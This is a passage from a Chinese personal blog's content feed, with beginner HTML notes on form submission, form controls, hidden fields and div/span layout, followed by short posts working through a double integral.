class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;百度&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http:\\localhost:8080/jd/login&quot;</span>&gt;</span></span><br><span class="line">用户名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">密码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">表单时以什么格式提交给服务器的？</span></span><br><span class="line"><span class="comment">http://localhost:8080/jd/login?username=abc&amp;pwd=111</span></span><br><span class="line"><span class="comment">格式:action?name=value&amp;name=value&amp;name=value</span></span><br><span class="line"><span class="comment">HTTP协议规定的，必须以这种格式提交给服务器 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">重点，表单写了name属性的，一律会提交给服务器。</span></span><br><span class="line"><span class="comment">name为空好像也不提交，不知道是交了没有</span></span><br><span class="line"><span class="comment">在测试时并不会多了&amp;</span></span><br><span class="line"><span class="comment">value没有写的时候，value的默认值是空字符串，java代码得到的是 string = &quot;&quot;;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http:\\localhost:8080/jd/login&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>  /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--text类型value由用户写--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;清空&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="用户注册表单"><a href="#用户注册表单" class="headerlink" title="用户注册表单"></a>用户注册表单</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>用户注册表单<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">用户注册:</span></span><br><span class="line"><span class="comment">用户名</span></span><br><span class="line"><span class="comment">密码</span></span><br><span class="line"><span class="comment">确认密码</span></span><br><span class="line"><span class="comment">性别</span></span><br><span class="line"><span class="comment">兴趣爱好</span></span><br><span class="line"><span class="comment">学历</span></span><br><span class="line"><span class="comment">简介</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">accept</span>=<span class="string">&quot;http://localhost:8080/jd/register&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">form表单method属性</span></span><br><span class="line"><span class="comment">gets:用户提交的信息会显示在地址栏上</span></span><br><span class="line"><span class="comment">post:用户名提交的信息不会显示在浏览器地址栏上</span></span><br><span class="line"><span class="comment">当用户提交的信息含有敏感信息时建议用post方式提交</span></span><br><span class="line"><span class="comment">默认时gets方式，只有methon指定时post时才是post请求</span></span><br><span class="line"><span class="comment">两种方式提交的数据格式还是一样的</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">用户名</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">密码</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userpwd&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">确认密码 <span class="comment">&lt;!--确认密码不用发到服务器，JavaScript就可以解决--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">性别<span class="comment">&lt;!--name相同时只能选一个，name不同是可以都选--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--checked 默认选中--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">checked</span> /&gt;</span>男</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span>女</span><br><span class="line"><span class="comment">&lt;!--单选按钮的value必须手动指定--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">兴趣爱好</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;interest&quot;</span> <span class="attr">value</span>=<span class="string">&quot;basketball&quot;</span> /&gt;</span>打篮球</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;interest&quot;</span> <span class="attr">value</span>=<span class="string">&quot;football&quot;</span> <span class="attr">checked</span>  /&gt;</span>打足球</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;interest&quot;</span> <span class="attr">value</span>=<span class="string">&quot;volleyball&quot;</span> /&gt;</span>打排球</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">学历</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;grade&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;gz&quot;</span>&gt;</span>高中<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;dz&quot;</span>&gt;</span>大专<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;bk&quot;</span> <span class="attr">selected</span>&gt;</span>本科<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="comment">&lt;!--默认选中--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;ss&quot;</span>&gt;</span>硕士<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">简介<span class="comment">&lt;!--文本域,没有value属性，填的就是value--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;60&quot;</span> <span class="attr">name</span>=<span class="string">&quot;introduce&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;清空&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--username=jackon&amp;userpwd=111&amp;gender=1&amp;interest=football&amp;grade=bk&amp;introduce=111--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--超链接也可以提交数据给服务器，但提交的数据时固定的。--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--超链接时gets请求，不是post请求--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost:8080/jd/register?username=ctl&amp;password=111&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--http://localhost:8080/jd/register?username=ctl&amp;password=111</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/MKi9Y1QOwZTHuaJ.png" alt="用户注册表单.png"></p><h2 id="一些控件"><a href="#一些控件" class="headerlink" title="一些控件"></a>一些控件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>一些控件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--下拉列表支持多选--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--multiple支持多选，但要按住CTRL--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--size控制显示的条数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">multiple</span>=<span class="string">&quot;multiple&quot;</span> <span class="attr">size</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>福建省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>江西省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>山东省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>海南省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>陕西省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文件上传专用--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--隐藏域hidden 控件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8080/jd/save&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--网页上看不到，但表单提交的时候数据会自动提交给服务器。--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--userid=111&amp;usercode=--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userid&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userid&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">用户代码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;usercode&quot;</span>  /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--readonly和disabled--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--相同点:都是只读不能修改</span></span><br><span class="line"><span class="comment">不同点:readonly可以提交给服务器,disabled数据包不会提交(即使由name属性)</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8080/jd/save&quot;</span>&gt;</span></span><br><span class="line">用户代码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;usercode&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span><span class="attr">readonly</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span> </span><br><span class="line">用户姓名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> <span class="attr">disabled</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交数据&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--usercode=111--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--input控件的maxlength的属性--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--设置文本框中可输入字符的数量--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;3&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--提一提--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--HTML中元素的id属性--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、在HTML文档中，任何元素（节点）都有id属性</span></span><br><span class="line"><span class="comment">2、id属性时该节点的唯一标识，所以在同一个HTML文档中id值不能重复</span></span><br><span class="line"><span class="comment">3、id有什么用?</span></span><br><span class="line"><span class="comment">a.id是为了让我们更方便的获取这个元素</span></span><br><span class="line"><span class="comment">b.JavaScript可以对HTML文档中任意节点进行增删改操作，那么增删改之前需要先拿到这个节点，通常我们通过id来拿节点对象</span></span><br><span class="line"><span class="comment">4、THML文档是一棵树，树上有很多节点，每一个节点有唯一的id</span></span><br><span class="line"><span class="comment">  (DOM树)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://smms.app/image/KYOs57H8RPvpTUaS&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://s2.loli.net/2023/03/05/KYO57H8RPvpTUaS.png&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span> <span class="attr">size</span>=<span class="string">&quot;50&quot;</span>&gt;</span>DOM树<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;myform&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;userpwd&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userpwd&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--id就是节点的身份证号，不能重复.--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--表单提交数据的时候只和name有关和id无关--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/j4AhuTDvOSVIlbQ.png" alt="122.png"></p><h2 id="div和span"><a href="#div和span" class="headerlink" title="div和span"></a>div和span</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML中的div和span<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、div和span有什么用？？</span></span><br><span class="line"><span class="comment">div和span都可以称为“图层”</span></span><br><span class="line"><span class="comment">div和span时可以定位的，只要顶下dic的左上角的x轴和y轴坐标即可</span></span><br><span class="line"><span class="comment">2、图层有什么用？</span></span><br><span class="line"><span class="comment">保证页面可以灵活的布局</span></span><br><span class="line"><span class="comment">3、最早的网页使用table布局，但是table不灵活，太死板</span></span><br><span class="line"><span class="comment">现代网页开发div布局使用最多，几乎很少使用table进行布局</span></span><br><span class="line"><span class="comment">4、div和span的区别？</span></span><br><span class="line"><span class="comment">默认情况下div会占用一行，span不会占用一行</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span>&gt;</span>我是一个div<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div2&quot;</span>&gt;</span>我是一个div<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;span1&quot;</span>&gt;</span>我是一个span标签<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;span2&quot;</span>&gt;</span>我是一个span标签<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/GDiRjskFudHpvTM.png" alt="11.png"></p><h1 id="暂停于此"><a href="#暂停于此" class="headerlink" title="暂停于此"></a>暂停于此</h1>]]></content>
      
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一道积分笔记</title>
      <link href="/2022/10/16/%E4%B8%80%E9%81%93%E7%A7%AF%E5%88%86%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/10/16/%E4%B8%80%E9%81%93%E7%A7%AF%E5%88%86%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/10/16/oQcA3TLsHYMVnkb.png" alt="MommyTalk1665933979433.png"><br><strong>忘记加绝对值</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 奇思妙想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇文章</title>
      <link href="/2022/10/15/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
      <url>/2022/10/15/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="以一道数学题开始我的发文"><a href="#以一道数学题开始我的发文" class="headerlink" title="以一道数学题开始我的发文"></a>以一道数学题开始我的发文</h1><p><font size=4>废话不多说，直接上题</p><div align=center><img src="https://latex.codecogs.com/svg.image?\iint_D&space;\frac{(x&plus;y)&space;\ln&space;\left(1&plus;\frac{y}{x}\right)}{\sqrt{1-x-y}}&space;\mathrm{d}&space;x&space;\mathrm{d}&space;y" title="https://latex.codecogs.com/svg.image?\iint_D \frac{(x+y) \ln \left(1+\frac{y}{x}\right)}{\sqrt{1-x-y}} \mathrm{d} x \mathrm{d} y" /> </div>&emsp; 其中区域D由直线x + y = 1 与两坐标轴所围成得三角形区域。<p><strong>解:</strong><br>　　这题的式子较为复杂，直接求解可能计算量偏大，进而考虑其它方法，首先考虑换元法.<br>　　不妨设：</p><div align=center><img src="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x&plus;y=u&space;\\\frac{y}{x}=u\end{array}\right." title="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x+y=u \\\frac{y}{x}=u\end{array}\right." /> </div>　　解，得：<div align=center><img src="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x=\frac{u}{1&plus;u}&space;\\y=\frac{u&space;v}{1&plus;v}\end{array}\right." title="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x=\frac{u}{1+u} \\y=\frac{u v}{1+v}\end{array}\right." /> </div>　　因为由x, y 两个变量的变换所以我们需要用到<strong>隐函数存在定理3</strong>的Jacobi行列式，下面<p><img src="https://s2.loli.net/2022/10/15/yJCXGEU2qwHfaVD.png" alt="例子.png"> </p><p>【注】设 <img src="https://latex.codecogs.com/svg.image?x=x(u,&space;v),&space;\quad&space;y=y(u,&space;v)" title="https://latex.codecogs.com/svg.image?x=x(u, v), \quad y=y(u, v)" /> 